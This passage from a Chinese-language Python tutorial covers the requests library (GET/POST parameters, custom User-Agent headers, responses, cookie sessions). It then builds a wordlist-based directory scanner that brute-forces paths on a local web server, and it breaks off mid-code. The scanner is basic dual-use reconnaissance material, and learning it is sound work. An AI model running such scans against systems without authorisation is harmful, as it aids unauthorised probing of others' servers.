title="Python-HTTP请求"></a>Python-HTTP请求</h3><p>requests模块发送请求有data、params两种携带参数的方法。</p><p>params在get请求中使用，data在post请求中使用。</p><h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">不带参数 r&#x3D;requests.get(url)</span><br><span class="line">带数  r&#x3D;requests.get(url&#x3D;url,params&#x3D;&#123;key1&#x3D;value1,key2&#x3D;value2&#125;)</span><br><span class="line"></span><br><span class="line"> r.url获取请求URL</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1/test.php&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;登陆&#x27;</span>&#125;</span><br><span class="line">r=requests.get(url,params=payload)</span><br><span class="line">print(r.status_code)</span><br><span class="line">print(r.url)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//<span class="number">200</span></span><br><span class="line">http://127.0.0.1/test.php?username=1&amp;password=1&amp;submit=%E7%99%BB%E9%99%86</span><br><span class="line">    &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;input class=&#x27;input&#x27; type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;账户&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;input class=&#x27;input&#x27;  type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;密码&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;登陆&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">不带参数 requests.post(url)</span><br><span class="line">带参数 requests.post(url,data&#x3D;&#123;key1,value&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1/test.php&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;登陆&#x27;</span>&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">print(r.status_code)</span><br><span class="line">print(r.url)</span><br><span class="line">print(r.text)</span><br><span class="line">print(type(r.text))</span><br><span class="line"></span><br><span class="line">//<span class="number">200</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/test.php</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;input class=&#x27;input&#x27; type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;账户&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;input class=&#x27;input&#x27;  type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;密码&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;登陆&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="自定义请求头"><a href="#自定义请求头" class="headerlink" title="自定义请求头"></a>自定义请求头</h4><p>headers = {key1:value2}</p><p>requests.get(url,headers=headers)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1/test.php&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;HAHA&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">r1=requests.get(url)</span><br><span class="line">print(r1.request.headers)</span><br><span class="line">r=requests.get(url,headers=headers)</span><br><span class="line">print(r.request.headers)</span><br><span class="line"></span><br><span class="line">//&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;python-requests/2.24.0&#x27;</span>, <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>, <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>, <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;HAHA&#x27;</span>, <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>, <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>, <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>&#125;</span><br><span class="line">//用于一些题目需要修改UA头</span><br></pre></td></tr></table></figure><h4 id="自定义headers头"><a href="#自定义headers头" class="headerlink" title="自定义headers头"></a>自定义headers头</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;https://www.baidu.com&quot;</span></span><br><span class="line">r=requests.get(url)</span><br><span class="line">print(r.request.headers)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#x27;User-Agent&#x27;: &#x27;python-requests/2.24.0&#x27;, &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;, &#x27;Accept&#x27;: &#x27;*/*&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;https://www.baidu.com&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">r=requests.get(url,headers=headers)</span><br><span class="line">print(r.request.headers)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36&#x27;, &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;, &#x27;Accept&#x27;: &#x27;*/*&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Python-HTTP响应"><a href="#Python-HTTP响应" class="headerlink" title="Python-HTTP响应"></a>Python-HTTP响应</h3><h4 id="获取响应状态码"><a href="#获取响应状态码" class="headerlink" title="获取响应状态码"></a>获取响应状态码</h4><p><code>r_status_code</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line">无线局域网适配器 WLAN:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : </span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 192.168.xxx.xxx</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 192.168.xxx.xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://192.168.xxx.xxx/test.php&quot;</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">print(r.status_code)</span><br><span class="line"></span><br><span class="line">url1=<span class="string">&quot;http://192.168.xxx.xxx/test123.php&quot;</span></span><br><span class="line">r1 = requests.get(url1)</span><br><span class="line">print(r1.status_code)</span><br><span class="line"></span><br><span class="line">//<span class="number">200</span></span><br><span class="line"><span class="number">404</span>  （不存在页面返回<span class="number">404</span>）</span><br><span class="line">//url将<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>改写成无线局域网IPv4地址</span><br></pre></td></tr></table></figure><h4 id="获取响应文本"><a href="#获取响应文本" class="headerlink" title="获取响应文本"></a>获取响应文本</h4><p><code>r.content</code></p><p><code>r.text</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">requests对象的get和post方法都会返回一个Response对象，这个对象里面存的是服务器返回的所有信息，包括响应头，响应状态码等。其中返回的网页部分会存在.content和.text两个对象中。</span><br><span class="line"></span><br><span class="line">两者区别在于，content中间存的是字节码，而text中存的是Beautifulsoup根据猜测的编码方式将content内容编码成字符串。</span><br><span class="line"></span><br><span class="line">直接输出content，会发现前面存在b&#39;这样的标志，这是字节字符串的标志，而text是，没有前面的b,对于纯ascii码，这两个可以说一模一样，对于其他的文字，需要正确编码才能正常显示。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://192.168.xxx.xxx/test.php&quot;</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">print(r.status_code)</span><br><span class="line">print(r.text)</span><br><span class="line">print(<span class="string">&quot;*&quot;</span>*<span class="number">50</span>)</span><br><span class="line">print(r.content)</span><br><span class="line"></span><br><span class="line">//<span class="number">200</span></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;input class=&#x27;input&#x27; type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;账户&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;input class=&#x27;input&#x27;  type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;密码&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;登陆&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line">**************************************************</span><br><span class="line"><span class="string">b&#x27;&lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;\r\n\t\t&lt;p&gt;&lt;input class=\&#x27;input\&#x27; type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;\xe8\xb4\xa6\xe6\x88\xb7&quot;&gt;&lt;/p&gt;\r\n\t\t&lt;p&gt;&lt;input class=\&#x27;input\&#x27;  type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;\xe5\xaf\x86\xe7\xa0\x81&quot;&gt;&lt;/p&gt;\r\n\t\t&lt;p&gt;&lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;\xe7\x99\xbb\xe9\x99\x86&quot;&gt;&lt;/p&gt;\r\n\t&lt;/form&gt;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="获取响应头"><a href="#获取响应头" class="headerlink" title="获取响应头"></a>获取响应头</h4><p><code>r.headers</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://192.168.xxx.xxx/test.php&quot;</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="comment">#响应头</span></span><br><span class="line">print(r.headers)</span><br><span class="line"><span class="comment">#请求头</span></span><br><span class="line">print(r.request.headers)</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;Date&#x27;</span>: <span class="string">&#x27;Fri, 06 Nov 2020 13:40:55 GMT&#x27;</span>, <span class="string">&#x27;Server&#x27;</span>: <span class="string">&#x27;Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9&#x27;</span>, <span class="string">&#x27;X-Powered-By&#x27;</span>: <span class="string">&#x27;PHP/7.0.12&#x27;</span>, <span class="string">&#x27;Keep-Alive&#x27;</span>: <span class="string">&#x27;timeout=5, max=100&#x27;</span>, <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>, <span class="string">&#x27;Transfer-Encoding&#x27;</span>: <span class="string">&#x27;chunked&#x27;</span>, <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=UTF-8&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;python-requests/2.24.0&#x27;</span>, <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>, <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>, <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="Python-会话编程"><a href="#Python-会话编程" class="headerlink" title="Python 会话编程"></a>Python 会话编程</h3><h4 id="携带Cookie的会话"><a href="#携带Cookie的会话" class="headerlink" title="携带Cookie的会话"></a>携带Cookie的会话</h4><p>访问某些页面时，会通过Set-Cookie设置Cookie值，以便下一次访问自动提交Cookie进行身份验证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;https://www.baidu.com&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">print(r.cookies)</span><br><span class="line">print(r.request.headers)</span><br><span class="line"></span><br><span class="line">r1=s.get(url)</span><br><span class="line">print(r1.request.headers)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;RequestsCookieJar[&lt;Cookie BDORZ=<span class="number">27315</span> <span class="keyword">for</span> .baidu.com/&gt;]&gt;</span><br><span class="line">&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;python-requests/2.24.0&#x27;</span>, <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>, <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>, <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;python-requests/2.24.0&#x27;</span>, <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>, <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>, <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>, <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;BDORZ=27315&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="Python目录扫描工具"><a href="#Python目录扫描工具" class="headerlink" title="Python目录扫描工具"></a>Python目录扫描工具</h3><h4 id="目录扫描原理"><a href="#目录扫描原理" class="headerlink" title="目录扫描原理"></a>目录扫描原理</h4><p>读取字典文件，拼接URL</p><p>HTTP GET读取URL</p><p>判断状态码 输出存在目录</p><p>（如果状态码是200，则当前目录存在，如果状态码是404，则当前页面不存在）</p><h4 id="字典文件读取"><a href="#字典文件读取" class="headerlink" title="字典文件读取"></a>字典文件读取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">with open (&quot;filename.txt&quot;,&quot;r&quot;)as f:</span><br><span class="line">&#x2F;&#x2F;with open ： 用完后自动关闭文件，省去了手动添加f.close()功能</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f.readline()读取第一行的内容</span><br><span class="line">f.readlines()读取文件里面所有内容，把每行的内容放到一个list里面</span><br><span class="line">f.read()  在（）里输入需要读取的字节数，如果不指定字节数，则会输出文件的所有内容</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">print(line)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#Hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#World</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#haha</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">print(line.strip())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Hello</span><br><span class="line">World</span><br><span class="line">haha</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">line1 = f.readline()</span><br><span class="line">print(line1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Hello</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">line1 = f.read(<span class="number">4</span>)</span><br><span class="line">print(line1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Hell</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">line1 = f.read()</span><br><span class="line">print(line1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Hello</span></span><br><span class="line"><span class="comment">#World</span></span><br><span class="line"><span class="comment">#haha</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open (<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">print(line)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#World</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#haha</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#open(filename,mode)</span></span><br><span class="line"><span class="comment">#mode r=read</span></span><br><span class="line"><span class="comment">#     w 写操作会自动写入内容，并且对之前的内容进行覆盖</span></span><br><span class="line"><span class="comment">#     a 追加</span></span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line">f1 = open(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">f1.write(<span class="string">&#x27;brute&#x27;</span>)</span><br><span class="line">f1.close()</span><br><span class="line"></span><br><span class="line">f2=open(<span class="string">&quot;1.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f2.readlines():</span><br><span class="line">print(line.strip())</span><br><span class="line">f2.close()</span><br><span class="line">    </span><br><span class="line"><span class="comment">#brute</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="工具编写"><a href="#工具编写" class="headerlink" title="工具编写"></a>工具编写</h4><p>读取字典文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open (<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">line = line.strip()</span><br><span class="line">r = requests.get(url+line)</span><br><span class="line"><span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">print(<span class="string">&quot;url:&quot;</span>+r.url)</span><br><span class="line">            </span><br><span class="line"><span class="comment">#1.txt是字典文件，</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#1.txt</span><br><span class="line">Hello</span><br><span class="line">World</span><br><span class="line">haha</span><br><span class="line">app</span><br></pre></td></tr></table></figure><p>因为网站跟目录里面有一个app的文件夹，所以返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url:http:&#x2F;&#x2F;127.0.0.1&#x2F;app&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/6.png"></p><p>因为网站根目录里面没有Hello，World，haha的文件夹，所以会返回404</p><p>存在app的文件夹，所以会返回200</p><h4 id="参数优化"><a href="#参数优化" class="headerlink" title="参数优化"></a>参数优化</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">argv是sys模块的一个全局变量，也称sys模块的一个属性！argv本身为一个list类型的对象，Sys.argv[]是用来获取命令行参数的，sys.argv[0]表示代码本身文件路径，所以参数从1开始。argv[1]代表传入的第一个命令行参数</span><br><span class="line"></span><br><span class="line">注意：argv持有的每个元素的类型均为str（字符串）</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">python temp.py a b c d</span><br><span class="line">sys.argv &#x3D;&#x3D; [&quot;temp.py&quot;,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;]  #sys.argv是持有5个元素的list对象</span><br><span class="line"></span><br><span class="line">sys.argv[0]  &#x3D;&#x3D; &quot;temp.py&quot;   #第1个元素为模块名“temp.py”</span><br><span class="line"></span><br><span class="line">sys.argv[1] &#x3D;&#x3D; &quot;a&quot;               #第2个元素为&quot;a&quot;</span><br><span class="line"></span><br><span class="line">sys.argv[2] &#x3D;&#x3D; &quot;b&quot;               #第3个元素为&quot;b&quot;</span><br><span class="line"></span><br><span class="line">sys.argv[3] &#x3D;&#x3D; &quot;c&quot;               #第4个元素为&quot;c&quot;</span><br><span class="line"></span><br><span class="line">sys.argv[4] &#x3D;&#x3D; &quot;d&quot;               #第5个元素为&quot;d&quot;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 